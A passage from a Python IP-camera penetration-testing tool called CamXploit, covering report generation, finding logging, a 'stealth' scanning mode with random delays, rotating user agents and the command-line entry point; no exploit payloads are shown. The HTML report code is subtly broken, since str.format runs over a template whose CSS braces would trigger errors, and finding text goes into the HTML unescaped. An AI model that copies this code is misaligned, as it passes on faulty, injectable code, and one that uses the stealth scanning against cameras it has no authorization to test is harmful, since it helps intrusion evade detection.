                'high': len([f for f in self.findings if f['severity'] == 'HIGH']),
                'medium': len([f for f in self.findings if f['severity'] == 'MEDIUM']),
                'low': len([f for f in self.findings if f['severity'] == 'LOW']),
                'info': len([f for f in self.findings if f['severity'] == 'INFO'])
            },
            'findings': self.findings,
            'scan_options': {
                'port_range': self.port_range,
                'threads': self.threads,
                'verbose': self.verbose,
                'stealth': self.stealth
            }
        }
        
        # Save JSON report
        json_file = f"{self.output_file}.json"
        with open(json_file, 'w') as f:
            json.dump(json_report, f, indent=2)
        
        # Generate HTML report
        self.generate_html_report(json_report)
        
        # Generate text report
        self.generate_text_report(json_report)
        
        print(f"\n{Colors.GREEN}[+] Reports generated:{Colors.END}")
        print(f"    JSON: {json_file}")
        print(f"    HTML: {self.output_file}.html")
        print(f"    Text: {self.output_file}.txt")

    def generate_html_report(self, report_data):
        """Generate HTML report"""
        html_template = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>CamXploit Security Assessment Report</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
                .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid #333; padding-bottom: 20px; }
                .summary { display: flex; justify-content: space-around; margin: 20px 0; }
                .summary-box { text-align: center; padding: 15px; border-radius: 5px; min-width: 80px; }
                .critical { background: #ff4444; color: white; }
                .high { background: #ff8800; color: white; }
                .medium { background: #ffaa00; color: white; }
                .low { background: #88cc00; color: white; }
                .info { background: #0088cc; color: white; }
                .finding { margin: 20px 0; padding: 15px; border-left: 4px solid #ccc; background: #f9f9f9; }
                .finding.critical { border-left-color: #ff4444; }
                .finding.high { border-left-color: #ff8800; }
                .finding.medium { border-left-color: #ffaa00; }
                .finding.low { border-left-color: #88cc00; }
                .finding.info { border-left-color: #0088cc; }
                .finding-title { font-weight: bold; font-size: 16px; margin-bottom: 5px; }
                .finding-desc { margin: 10px 0; }
                .finding-proof { background: #f0f0f0; padding: 10px; border-radius: 3px; font-family: monospace; word-break: break-all; }
                .finding-recommendation { background: #e8f5e8; padding: 10px; border-radius: 3px; margin-top: 10px; }
                .toc { background: #f0f0f0; padding: 20px; border-radius: 5px; margin: 20px 0; }
                .toc a { text-decoration: none; color: #0066cc; }
                .toc a:hover { text-decoration: underline; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>CamXploit Security Assessment Report</h1>
                    <p><strong>Target:</strong> {target}</p>
                    <p><strong>Scan Date:</strong> {scan_date}</p>
                    <p><strong>Tool Version:</strong> {tool_version}</p>
                </div>
                
                <div class="summary">
                    <div class="summary-box critical">
                        <h3>{critical}</h3>
                        <p>Critical</p>
                    </div>
                    <div class="summary-box high">
                        <h3>{high}</h3>
                        <p>High</p>
                    </div>
                    <div class="summary-box medium">
                        <h3>{medium}</h3>
                        <p>Medium</p>
                    </div>
                    <div class="summary-box low">
                        <h3>{low}</h3>
                        <p>Low</p>
                    </div>
                    <div class="summary-box info">
                        <h3>{info}</h3>
                        <p>Info</p>
                    </div>
                </div>
                
                <div class="toc">
                    <h2>Table of Contents</h2>
                    {toc_content}
                </div>
                
                <h2>Detailed Findings</h2>
                {findings_content}
            </div>
        </body>
        </html>
        """
        
        # Generate TOC and findings content
        toc_content = ""
        findings_content = ""
        
        for i, finding in enumerate(report_data['findings'], 1):
            severity_class = finding['severity'].lower()
            
            # TOC entry
            toc_content += f'<p><a href="#finding-{i}">{i}. [{finding["severity"]}] {finding["title"]}</a></p>\n'
            
            # Finding content
            finding_html = f"""
            <div class="finding {severity_class}" id="finding-{i}">
                <div class="finding-title">[{finding['severity']}] {finding['title']}</div>
                <div class="finding-desc">{finding['description']}</div>
            """
            
            if finding.get('proof'):
                finding_html += f'<div class="finding-proof"><strong>Proof of Concept:</strong><br>{finding["proof"]}</div>'
            
            if finding.get('recommendation'):
                finding_html += f'<div class="finding-recommendation"><strong>Recommendation:</strong><br>{finding["recommendation"]}</div>'
            
            finding_html += "</div>\n"
            findings_content += finding_html
        
        # Format the HTML
        html_content = html_template.format(
            target=report_data['target'],
            scan_date=report_data['scan_date'],
            tool_version=report_data['tool_version'],
            critical=report_data['findings_summary']['critical'],
            high=report_data['findings_summary']['high'],
            medium=report_data['findings_summary']['medium'],
            low=report_data['findings_summary']['low'],
            info=report_data['findings_summary']['info'],
            toc_content=toc_content,
            findings_content=findings_content
        )
        
        # Save HTML report
        html_file = f"{self.output_file}.html"
        with open(html_file, 'w') as f:
            f.write(html_content)

    def generate_text_report(self, report_data):
        """Generate text-based report"""
        text_content = f"""
CamXploit Security Assessment Report
====================================

Target: {report_data['target']}
Scan Date: {report_data['scan_date']}
Tool Version: {report_data['tool_version']}

Executive Summary
-----------------
Total Findings: {report_data['findings_summary']['total']}
  - Critical: {report_data['findings_summary']['critical']}
  - High: {report_data['findings_summary']['high']}
  - Medium: {report_data['findings_summary']['medium']}
  - Low: {report_data['findings_summary']['low']}
  - Info: {report_data['findings_summary']['info']}

Detailed Findings
-----------------
"""
        
        for i, finding in enumerate(report_data['findings'], 1):
            text_content += f"""
{i}. [{finding['severity']}] {finding['title']}
{'=' * (len(finding['title']) + 10)}

Description: {finding['description']}
"""
            
            if finding.get('proof'):
                text_content += f"\nProof of Concept:\n{finding['proof']}\n"
            
            if finding.get('recommendation'):
                text_content += f"\nRecommendation:\n{finding['recommendation']}\n"
            
            text_content += "\n" + "-" * 80 + "\n"
        
        # Save text report
        text_file = f"{self.output_file}.txt"
        with open(text_file, 'w') as f:
            f.write(text_content)

    def log_finding(self, severity, title, description, proof=None, recommendation=None):
        """Log a security finding"""
        finding = {
            'timestamp': datetime.now().isoformat(),
            'severity': severity,
            'title': title,
            'description': description,
            'proof': proof,
            'recommendation': recommendation
        }
        
        self.findings.append(finding)
        
        # Print finding to console
        color = {
            'CRITICAL': Colors.RED,
            'HIGH': Colors.ORANGE,
            'MEDIUM': Colors.YELLOW,
            'LOW': Colors.GREEN,
            'INFO': Colors.CYAN
        }.get(severity, Colors.WHITE)
        
        print(f"{color}[{severity}] {title}: {description}{Colors.END}")
        if proof and self.verbose:
            print(f"  Proof: {proof}")

    def random_delay(self, min_delay=0.1, max_delay=1.0):
        """Add random delay for stealth scanning"""
        if self.stealth:
            delay = random.uniform(min_delay * 2, max_delay * 2)
        else:
            delay = random.uniform(min_delay, max_delay)
        time.sleep(delay)

    def get_random_user_agent(self):
        """Get random user agent for web requests"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101'
        ]
        return random.choice(user_agents)

def print_banner():
    """Print tool banner"""
    banner = f"""
{Colors.CYAN}
 ██████╗ █████╗ ███╗   ███╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔══██╗████╗ ████║╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║     ███████║██╔████╔██║ ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██║     ██╔══██║██║╚██╔╝██║ ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
╚██████╗██║  ██║██║ ╚═╝ ██║██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
 ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
{Colors.END}
{Colors.GREEN}Enhanced IP Camera Penetration Testing Tool v2.0{Colors.END}
{Colors.YELLOW}Comprehensive security assessment for IP cameras and IoT devices{Colors.END}
{Colors.RED}For authorized testing only - Use responsibly!{Colors.END}
"""
    print(banner)

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description='Enhanced IP Camera Penetration Testing Tool')
    parser.add_argument('target', help='Target IP address or hostname')
    parser.add_argument('-p', '--ports', default='21,22,23,25,53,80,110,443,554,993,995,8080,8081,8000,37777', 
                       help='Port range or comma-separated ports (default: common ports)')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('-o', '--output', help='Output file prefix')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-s', '--stealth', action='store_true', help='Stealth mode (slower but less detectable)')
    parser.add_argument('--timeout', type=int, default=10, help='Connection timeout (default: 10)')
    parser.add_argument('--user-agent', help='Custom User-Agent for web requests')
    parser.add_argument('--proxy', help='Proxy server (http://proxy:port)')
    
    args = parser.parse_args()
    
    try:
        # Validate target
        socket.inet_aton(args.target)
    except socket.error:
        try:
            args.target = socket.gethostbyname(args.target)
        except socket.gaierror:
            print(f"{Colors.RED}[-] Invalid target: {args.target}{Colors.END}")
            sys.exit(1)
    
    # Initialize scanner
    scanner = CamXploitEnhanced(
        target=args.target,
        port_range=args.ports,
        threads=args.threads,
        output_file=args.output,
        verbose=args.verbose,
        stealth=args.stealth,
        timeout=args.timeout,
        user_agent=args.user_agent,
        proxy=args.proxy
    )
    
    try:
        print(f"{Colors.GREEN}[+] Starting comprehensive security assessment of {args.target}{Colors.END}")
        scanner.run()
        print(f"{Colors.GREEN}[+] Assessment complete!{Colors.END}")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[-] Assessment interrupted by user{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[-] Error during assessment: {e}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()